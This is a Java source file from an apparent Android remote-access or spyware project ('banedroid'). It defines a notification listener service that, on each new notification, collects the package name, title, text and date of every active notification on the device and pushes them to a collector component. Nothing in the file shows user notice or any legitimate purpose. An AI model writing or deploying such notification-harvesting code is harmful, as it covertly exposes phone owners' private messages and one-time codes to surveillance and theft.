package com.example.banedroid.bane.notifications;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.os.Build;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.annotation.RequiresApi;

import com.example.banedroid.MainActivity;
import com.example.banedroid.service.BaneService;

import java.util.ArrayList;
import java.util.Date;

@SuppressLint("OverrideAbstract")
@RequiresApi(api = Build.VERSION_CODES.KITKAT)
public class NotificationService extends NotificationListenerService {

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        ArrayList<String> notifications = new ArrayList<>();
        for (StatusBarNotification sbm : NotificationService.this.getActiveNotifications()) {
            String title = sbm.getNotification().extras.getString("android.title");
            String text = sbm.getNotification().extras.getString("android.text");
            String package_name = sbm.getPackageName();
            String date = new Date(sbm.getNotification().when).toString();
            notifications.add("package: "+package_name+" title: "+title+" text: "+text+" date "+date);
        }
        NotificationManager.NotificationManager().push(notifications);
    }

    public void getNotifications(){
        ArrayList<String> notifications = new ArrayList<>();
        for (StatusBarNotification sbm : NotificationService.this.getActiveNotifications()) {
            String title = sbm.getNotification().extras.getString("android.title");
            String text = sbm.getNotification().extras.getString("android.text");
            String package_name = sbm.getPackageName();
            String date = new Date(sbm.getNotification().when).toString();
            notifications.add("package: "+package_name+" title: "+title+" text: "+text+" date "+date);
        }
        NotificationManager.NotificationManager().push(notifications);
    }

    private boolean isNotificationPermissionEnabled() {
        ContentResolver contentResolver = BaneService.context.getContentResolver();
        String enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = MainActivity.compName.getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }

}